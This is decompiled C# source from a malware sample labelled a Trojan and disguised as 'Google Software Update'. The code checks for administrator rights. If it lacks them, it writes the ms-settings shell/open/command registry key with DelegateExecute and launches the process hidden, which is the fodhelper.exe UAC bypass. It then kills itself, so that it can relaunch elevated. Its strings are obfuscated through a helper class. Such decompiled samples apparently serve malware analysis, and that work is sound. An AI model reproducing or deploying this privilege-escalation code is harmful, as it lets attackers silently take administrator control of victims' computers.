// Decompiled with JetBrains decompiler
// Type: C3904355907.C1466425173
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace C3904355907
{
  internal class C1466425173
  {
    private const string C3554254475 = "DelegateExecute";
    private const string C3904355907 = "C:\\Windows\\System32\\fodhelper.exe";
    private const string C1255198513 = "Software\\Classes\\ms-settings\\shell\\open\\command";

    public static bool C3554254475()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        return false;
      }
    }

    private static void C3554254475([In] string obj0)
    {
      try
      {
        C4067256894.C1255198513(0, DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ib(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iC(), (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
        C4067256894.C1255198513(0, DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ib(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz(), (object) obj0);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public static bool C3904355907()
    {
      if (C1466425173.C3554254475())
        return true;
      try
      {
        C1466425173.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ic() + Assembly.GetEntryAssembly().Location + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ah());
        Registry.CurrentUser.CreateSubKey(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ib());
        Registry.CurrentUser.CreateSubKey(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ib()).SetValue(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz(), (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iD(), RegistryValueKind.String);
        Registry.CurrentUser.CreateSubKey(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ib()).SetValue(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iC(), (object) 0, RegistryValueKind.DWord);
        Registry.CurrentUser.Close();
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.id(),
            Arguments = (DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iE() + Assembly.GetExecutingAssembly().Location)
          }
        }.Start();
        Process.GetCurrentProcess().Kill();
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        Environment.Exit(1);
      }
      return false;
    }
  }
}
